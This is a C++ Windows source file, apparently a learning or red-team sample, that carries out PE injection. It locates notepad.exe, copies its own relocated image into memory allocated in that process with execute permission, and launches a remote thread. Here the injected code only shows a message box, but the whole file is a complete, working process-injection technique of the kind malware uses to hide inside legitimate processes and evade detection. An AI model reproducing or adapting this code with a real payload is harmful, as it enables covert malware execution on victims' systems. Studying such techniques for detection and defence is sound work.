#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <string>


class PortableExecutable {
private:
    PROCESSENTRY32 pinfo;
    HANDLE ProcessesShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Taking the snapshot from your process 
public:
    DWORD GetPid(LPCTSTR ProcessName) {
        pinfo.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(ProcessesShot, &pinfo)) { // must call this first
            do {
                if (!lstrcmpi(pinfo.szExeFile, ProcessName)) {
                    CloseHandle(ProcessesShot);
                    return pinfo.th32ProcessID;
                }
            } while (Process32Next(ProcessesShot, &pinfo));
        }
        CloseHandle(ProcessesShot); // close handle on failure
        return 0;
    }
};

DWORD Inject() {
    char ModuleFileName[128];
    GetModuleFileNameA(0, ModuleFileName, sizeof(ModuleFileName)); // if it didn't work replace it with sizeof(ModuleFileName)
    MessageBoxA(0, ModuleFileName, "INJECTED XD", 0);
    return 0;
}

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


int main() {
    // Object Creation
    PortableExecutable PE;

    // Get the current images base address and size
    HMODULE base = GetModuleHandleA(0);
    PIMAGE_DOS_HEADER idh = (PIMAGE_DOS_HEADER)(base);
    PIMAGE_NT_HEADERS pnths = (PIMAGE_NT_HEADERS)((DWORD_PTR)(base)+idh->e_lfanew);
    size_t PEsz = pnths->OptionalHeader.SizeOfImage;

    // Allocate enough memory for the image inside the processes own address space
    LPVOID allocmem = VirtualAlloc(0, PEsz, MEM_COMMIT, PAGE_READWRITE);
    memcpy(allocmem, base, PEsz); // Copy the PE Headers to the local allocated memory  

    // Opening the process to use it to allocate memory in it 
    HANDLE TheProcess = OpenProcess(MAXIMUM_ALLOWED, 0, PE.GetPid(TEXT("notepad.exe")));
    if (!TheProcess) {
        std::cout << "Process Not Found.\n" << std::endl;
        std::cout << "Error Code(Google It): " << GetLastError() << std::endl;
        return -1;
    }
    LPVOID S_allocmem = VirtualAllocEx(TheProcess, 0, PEsz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);


    DWORD_PTR BaseOffset = (DWORD_PTR)S_allocmem - (DWORD_PTR)base; // Calculating the offset between the addresses where the image is located using virtualallocex
    // Rellocation of the memory allocated 
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)allocmem + pnths->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    DWORD relocationEntriesCount = 0;
    PDWORD_PTR patchedAddress;
    PBASE_RELOCATION_ENTRY relocationRVA = NULL;
    // Iterate the reloc table of the local image and modify all absolute addresses to work at the address returned by VirtualAllocEx
    while (relocationTable->SizeOfBlock > 0) {
        relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
        for (short i = 0; i < relocationEntriesCount; i++) {
            if (relocationRVA[i].Offset) {
                patchedAddress = (PDWORD_PTR)((DWORD_PTR)allocmem + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += BaseOffset;
            }
        }
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }


    bool wpm = WriteProcessMemory(TheProcess, S_allocmem, allocmem, PEsz, 0); // Copy the local image into the memory region allocated in the target process
    HANDLE crt = CreateRemoteThread(TheProcess, 0, NULL, (LPTHREAD_START_ROUTINE)((DWORD_PTR)Inject + BaseOffset), 0, 0, 0); // Create a new thread with the start address set to the remote address of the function 
    std::cout << "Injected Successfully." << std:: endl;
    return 0;
}